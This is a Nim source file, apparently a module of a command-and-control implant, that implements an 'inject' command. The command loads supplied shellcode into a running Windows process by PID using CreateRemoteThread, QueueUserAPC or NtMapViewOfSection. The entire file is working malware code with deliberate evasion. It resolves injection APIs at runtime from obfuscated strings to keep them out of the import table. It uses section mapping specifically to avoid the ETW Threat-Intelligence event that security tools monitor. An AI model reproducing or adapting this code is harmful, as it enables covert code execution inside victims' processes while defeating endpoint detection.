## inject — Shellcode injection into a running process by PID (Windows only).
## Techniques:
##   createremotethread — allocate RW, write, VirtualProtectEx RX, CreateRemoteThread
##   queueapcthread     — allocate RW, write, RX, QueueUserAPC on every thread of target
##   ntmapview          — NtCreateSection+NtMapViewOfSection (pagefile section, avoids
##                        NtAllocateVirtualMemory ETW MWTI event) + CreateRemoteThread
##
## IAT evasion: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, VirtualProtectEx,
## QueueUserAPC, NtCreateSection, NtMapViewOfSection, NtUnmapViewOfSection are NOT
## statically imported — resolved at runtime via GetProcAddress with hidstr'd names.
import std/[base64, json, strutils]
import core/types
import core/dynapi
import commands/registry
import crypto/strenc

when defined(windows):
  type
    DWORD     = uint32
    LONG      = int32
    NTSTATUS  = LONG
    BOOL      = int32
    LPVOID    = pointer
    SIZE_T    = uint
    ULONG_PTR = uint

  const
    PROCESS_ALL_ACCESS = DWORD(0x001FFFFF)
    MEM_COMMIT         = DWORD(0x00001000)
    MEM_RESERVE        = DWORD(0x00002000)
    PAGE_READWRITE     = DWORD(0x04)
    PAGE_EXECUTE_READ  = DWORD(0x20)
    TH32CS_SNAPTHREAD  = DWORD(0x00000004)
    THREAD_ALL_ACCESS  = DWORD(0x001FFFFF)
    INVALID_HANDLE_VALUE = HANDLE(-1)
    SECTION_ALL_ACCESS_I = DWORD(0x000F001F)
    SEC_COMMIT_I       = DWORD(0x8000000)
    STATUS_SUCCESS_I   = NTSTATUS(0)
    ViewUnmapI         = DWORD(2)
    # NtMapViewOfSection uses RWX on the section object itself so both local
    # (RW for writing) and remote (RX for execution) views can be created.
    PAGE_EXECUTE_READWRITE = DWORD(0x40)

  type
    THREADENTRY32 {.pure.} = object
      dwSize:             DWORD
      cntUsage:           DWORD
      th32ThreadID:       DWORD
      th32OwnerProcessID: DWORD
      tpBasePri:          LONG
      tpDeltaPri:         LONG
      dwFlags:            DWORD

  # --- Static imports: benign APIs common in legitimate software ---
  proc OpenProcess(da: DWORD, inherit: BOOL, pid: DWORD): HANDLE
    {.importc: "OpenProcess", dynlib: "kernel32".}
  proc CloseHandle(h: HANDLE): BOOL
    {.importc: "CloseHandle", dynlib: "kernel32".}
  proc GetCurrentProcess(): HANDLE
    {.importc: "GetCurrentProcess", dynlib: "kernel32".}
  proc CreateToolhelp32Snapshot(f: DWORD, pid: DWORD): HANDLE
    {.importc: "CreateToolhelp32Snapshot", dynlib: "kernel32".}
  proc Thread32First(snap: HANDLE, te: ptr THREADENTRY32): BOOL
    {.importc: "Thread32First", dynlib: "kernel32".}
  proc Thread32Next(snap: HANDLE, te: ptr THREADENTRY32): BOOL
    {.importc: "Thread32Next", dynlib: "kernel32".}
  proc OpenThread(da: DWORD, inherit: BOOL, tid: DWORD): HANDLE
    {.importc: "OpenThread", dynlib: "kernel32".}

  # --- Function pointer types: injection APIs resolved at runtime (not in IAT) ---
  type
    FnVirtualAllocEx       = proc(h: HANDLE, a: LPVOID, sz: SIZE_T,
                                   t: DWORD, p: DWORD): LPVOID {.stdcall.}
    FnWriteProcessMemory   = proc(h: HANDLE, a: LPVOID, buf: pointer,
                                   sz: SIZE_T, wr: ptr SIZE_T): BOOL {.stdcall.}
    FnVirtualProtectEx     = proc(h: HANDLE, a: LPVOID, sz: SIZE_T,
                                   prot: DWORD, old: ptr DWORD): BOOL {.stdcall.}
    FnCreateRemoteThread   = proc(h: HANDLE, ta: pointer, ss: SIZE_T,
                                   start: LPVOID, param: LPVOID,
                                   flags: DWORD, tid: ptr DWORD): HANDLE {.stdcall.}
    FnQueueUserAPC         = proc(fn: LPVOID, thr: HANDLE,
                                   data: ULONG_PTR): DWORD {.stdcall.}
    FnNtCreateSection      = proc(sec: ptr HANDLE, acc: DWORD, oa: pointer,
                                   maxSz: ptr int64, prot: DWORD, alloc: DWORD,
                                   file: HANDLE): NTSTATUS {.stdcall.}
    FnNtMapViewOfSection   = proc(sec: HANDLE, proc_: HANDLE,
                                   base: ptr LPVOID, zb: uint, cs: SIZE_T,
                                   off: pointer, vsz: ptr SIZE_T,
                                   inh: DWORD, at: DWORD,
                                   prot: DWORD): NTSTATUS {.stdcall.}
    FnNtUnmapViewOfSection = proc(proc_: HANDLE,
                                   base: LPVOID): NTSTATUS {.stdcall.}

  var
    pVirtualAllocEx:       FnVirtualAllocEx       = nil
    pWriteProcessMemory:   FnWriteProcessMemory    = nil
    pVirtualProtectEx:     FnVirtualProtectEx      = nil
    pCreateRemoteThread:   FnCreateRemoteThread    = nil
    pQueueUserAPC:         FnQueueUserAPC          = nil
    pNtCreateSection:      FnNtCreateSection       = nil
    pNtMapViewOfSection:   FnNtMapViewOfSection    = nil
    pNtUnmapViewOfSection: FnNtUnmapViewOfSection  = nil
    injApisLoaded = false

  proc loadInjectionApis() =
    if injApisLoaded: return
    pVirtualAllocEx     = cast[FnVirtualAllocEx](resolveK32(hidstr("VirtualAllocEx")))
    pWriteProcessMemory = cast[FnWriteProcessMemory](resolveK32(hidstr("WriteProcessMemory")))
    pVirtualProtectEx   = cast[FnVirtualProtectEx](resolveK32(hidstr("VirtualProtectEx")))
    pCreateRemoteThread = cast[FnCreateRemoteThread](resolveK32(hidstr("CreateRemoteThread")))
    pQueueUserAPC       = cast[FnQueueUserAPC](resolveK32(hidstr("QueueUserAPC")))
    pNtCreateSection    = cast[FnNtCreateSection](resolveNtdll(hidstr("NtCreateSection")))
    pNtMapViewOfSection = cast[FnNtMapViewOfSection](resolveNtdll(hidstr("NtMapViewOfSection")))
    pNtUnmapViewOfSection = cast[FnNtUnmapViewOfSection](resolveNtdll(hidstr("NtUnmapViewOfSection")))
    injApisLoaded = true

  # ---------------------------------------------------------------------------

  proc injectCRT(hProcess: HANDLE, remoteMem: LPVOID): string =
    if pCreateRemoteThread == nil:
      return hidstr("Error: CreateRemoteThread not resolved")
    var threadId: DWORD = 0
    let hThread = pCreateRemoteThread(hProcess, nil, SIZE_T(0),
                                      remoteMem, nil, DWORD(0), addr threadId)
    if hThread == 0 or hThread == INVALID_HANDLE_VALUE:
      return hidstr("Error: CreateRemoteThread failed")
    discard CloseHandle(hThread)
    return hidstr("TID ") & $threadId

  proc injectAPC(hProcess: HANDLE, remoteMem: LPVOID, pid: DWORD): string =
    if pQueueUserAPC == nil:
      return hidstr("Error: QueueUserAPC not resolved")
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, DWORD(0))
    if snap == INVALID_HANDLE_VALUE:
      return hidstr("Error: CreateToolhelp32Snapshot failed")
    defer: discard CloseHandle(snap)

    var te: THREADENTRY32
    te.dwSize = DWORD(sizeof(THREADENTRY32))
    var queued = 0
    if Thread32First(snap, addr te) != 0:
      while true:
        if te.th32OwnerProcessID == pid:
          let hThr = OpenThread(THREAD_ALL_ACCESS, BOOL(0), te.th32ThreadID)
          if hThr != 0 and hThr != INVALID_HANDLE_VALUE:
            discard pQueueUserAPC(remoteMem, hThr, ULONG_PTR(0))
            inc queued
            discard CloseHandle(hThr)
        if Thread32Next(snap, addr te) == 0: break

    if queued == 0:
      return hidstr("Error: no threads found in target process")
    return $queued & hidstr(" APC(s) queued")

  proc allocMapView(hProcess: HANDLE, shellcode: seq[byte]): LPVOID =
    ## NtCreateSection + NtMapViewOfSection (pagefile-backed).
    ## Avoids NtAllocateVirtualMemory (called by VirtualAllocEx) which triggers
    ## the ETW Microsoft-Windows-Threat-Intelligence MWTI event.
    if pNtCreateSection == nil or pNtMapViewOfSection == nil or
       pNtUnmapViewOfSection == nil:
      return nil
    var hSec: HANDLE = 0
    var sz = int64(shellcode.len)
    if pNtCreateSection(addr hSec, SECTION_ALL_ACCESS_I, nil, addr sz,
                        PAGE_EXECUTE_READWRITE, SEC_COMMIT_I,
                        HANDLE(0)) != STATUS_SUCCESS_I:
      return nil
    defer: discard CloseHandle(hSec)

    var localBase: LPVOID = nil
    var viewSz: SIZE_T = 0
    if pNtMapViewOfSection(hSec, GetCurrentProcess(), addr localBase, 0, 0, nil,
                           addr viewSz, ViewUnmapI, 0,
                           PAGE_READWRITE) != STATUS_SUCCESS_I:
      return nil

    copyMem(localBase, unsafeAddr shellcode[0], shellcode.len)
    discard pNtUnmapViewOfSection(GetCurrentProcess(), localBase)

    var remoteBase: LPVOID = nil
    viewSz = 0
    if pNtMapViewOfSection(hSec, hProcess, addr remoteBase, 0, 0, nil,
                           addr viewSz, ViewUnmapI, 0,
                           PAGE_EXECUTE_READ) != STATUS_SUCCESS_I:
      return nil
    return remoteBase

# ---------------------------------------------------------------------------

proc injectExecute(taskId: string, params: JsonNode, state: AgentState,
                   send: SendMsg): TaskResult =
  when not defined(windows):
    return TaskResult(output: hidstr("inject is Windows-only"),
                      status: "error", completed: true)
  else:
    loadInjectionApis()

    let pid          = DWORD(params{"pid"}.getInt(0))
    let technique    = params{"technique"}.getStr(hidstr("createremotethread"))
    let shellcodeB64 = params{"shellcode"}.getStr("")

    if pid == 0:
      return TaskResult(output: hidstr("Error: pid parameter required"),
                        status: "error", completed: true)
    if shellcodeB64.len == 0:
      return TaskResult(output: hidstr("Error: shellcode parameter required"),
                        status: "error", completed: true)

    var shellcode: seq[byte]
    try:
      let decoded = decode(shellcodeB64)
      shellcode = newSeq[byte](decoded.len)
      for i, c in decoded: shellcode[i] = byte(ord(c))
    except Exception as e:
      return TaskResult(output: hidstr("Error decoding shellcode: ") & e.msg,
                        status: "error", completed: true)

    if shellcode.len == 0:
      return TaskResult(output: hidstr("Error: empty shellcode"),
                        status: "error", completed: true)

    let hProcess = OpenProcess(PROCESS_ALL_ACCESS, BOOL(0), pid)
    if hProcess == 0:
      return TaskResult(output: hidstr("Error: OpenProcess failed for PID ") & $pid,
                        status: "error", completed: true)
    defer: discard CloseHandle(hProcess)

    var remoteMem: LPVOID = nil
    var allocErr = ""

    if technique == hidstr("ntmapview"):
      remoteMem = allocMapView(hProcess, shellcode)
      if remoteMem == nil:
        allocErr = hidstr("Error: NtMapViewOfSection allocation failed")
    else:
      if pVirtualAllocEx == nil or pWriteProcessMemory == nil or
         pVirtualProtectEx == nil:
        return TaskResult(output: hidstr("Error: injection APIs not resolved"),
                          status: "error", completed: true)
      remoteMem = pVirtualAllocEx(hProcess, nil, SIZE_T(shellcode.len),
                                  MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
      if remoteMem == nil:
        allocErr = hidstr("Error: VirtualAllocEx failed")
      else:
        var written: SIZE_T = 0
        if pWriteProcessMemory(hProcess, remoteMem, addr shellcode[0],
                               SIZE_T(shellcode.len), addr written) == 0:
          return TaskResult(output: hidstr("Error: WriteProcessMemory failed"),
                            status: "error", completed: true)
        var oldProt: DWORD = 0
        discard pVirtualProtectEx(hProcess, remoteMem, SIZE_T(shellcode.len),
                                  PAGE_EXECUTE_READ, addr oldProt)

    if remoteMem == nil:
      return TaskResult(output: allocErr, status: "error", completed: true)

    let msg =
      if technique == hidstr("queueapcthread"):
        injectAPC(hProcess, remoteMem, pid)
      else:
        injectCRT(hProcess, remoteMem)

    let ok = not msg.startsWith(hidstr("Error"))
    return TaskResult(
      output: if ok: hidstr("Inject OK - PID ") & $pid & hidstr(" (") &
                     $shellcode.len & hidstr(" bytes, ") & technique &
                     hidstr("): ") & msg
              else: msg,
      status:    if ok: "success" else: "error",
      completed: true,
    )

proc initInject*() =
  register(hidstr("inject"), injectExecute)
